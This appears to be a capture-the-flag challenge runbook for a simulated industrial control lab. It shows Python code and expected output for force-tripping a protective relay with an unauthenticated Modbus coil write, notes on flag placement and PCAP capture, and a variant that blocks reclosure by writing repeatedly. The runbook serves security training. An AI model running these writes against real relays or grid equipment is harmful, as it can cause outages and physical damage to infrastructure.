# Runbook: IED relay force-trip via Modbus coil

Force-trip a protective relay by writing coil 0 via unauthenticated Modbus. The breaker
opens. The physics engine reflects the loss of load.

- Technique: [1: unauthorised state manipulation](../../attack-surface.md)
- Challenge type: Network (PCAP) or Realist
- Difficulty: Intermediate

## Components to start

```
cd ics-simlab
make generate && make build
docker compose -f zones/control/docker-compose.yml up -d uupl-relay-a uupl-turbine-plc uupl-breaker-a
```

The relay polls the turbine PLC every 500 ms. The breaker actuator executes the trip command.
Both are needed to produce a visible consequence in the physics engine.

## Attack path

```python
from pymodbus.client import ModbusTcpClient

c = ModbusTcpClient('10.10.3.31', port=502)
c.connect()

# Read current relay state
r = c.read_coils(address=0, count=2, slave=1)
print(r.bits[:2])
# [False, False]: trip=False, breaker=closed

# Read trip log (holding registers 10-19, last 10 events, 2 registers per event)
r = c.read_holding_registers(address=10, count=10, slave=1)
print(r.registers)
# All zeros: no prior events

# Force trip
c.write_coil(address=0, value=True, slave=1)

# Confirm
r = c.read_coils(address=0, count=2, slave=1)
print(r.bits[:2])
# [True, True]: trip=True, breaker=open

# Trip log now shows event
r = c.read_holding_registers(address=10, count=10, slave=1)
print(r.registers)
# [timestamp_high, timestamp_low, cause_code, voltage, current, ...]
```

## Flag placement

Two options depending on challenge type:

Network challenge: place the flag encoded across holding registers `HR[5]` and `HR[6]` (unused
in the default implementation). The participant reads holding registers before and after the
trip; the flag is only present in the post-trip state, written by the relay logic when
`trip_flag` is set. Modify `relay_server.py` to write the flag registers on trip.

Realist challenge: place the flag in the trip log as a cause code value that maps to the flag
string. The participant reads the log after the trip fires and submits the decoded value.

## Artefact (Network challenge)

The PCAP contains, in sequence:
* FC01 request and response: initial coil read, both bits False
* FC03 request and response: trip log read, all zeros
* FC05 write coil: address 0, value 0xFF00 (True)
* FC05 response: echo confirms write accepted
* FC01 request and response: coil read, both bits True
* FC03 request and response: trip log with event entry
* FC03 request and response: holding registers, flag now present in `HR[5]`/`HR[6]`

Capture with:

```
tcpdump -i any -w relay-trip.pcap port 502
```

The trip and physics response happen within 500 ms of the write. The PCAP is dense but
unambiguous: the function codes tell the story.

## The protection gap

Modbus coil writes require no authentication and no prior knowledge of the device beyond
its IP and port. The relay's job is to protect the turbine; one unauthenticated write
bypasses that protection entirely. CVE-2022-3084 (GE Reason RT430) is a direct
real-world equivalent.

## Race condition variant

Extend to the auto-reclose race condition: the relay recloses after 10 seconds; continuously
writing `coil 0 = True` prevents reclosure indefinitely. That variant is a Realist-only
challenge because the timing behaviour does not compress meaningfully into a PCAP.
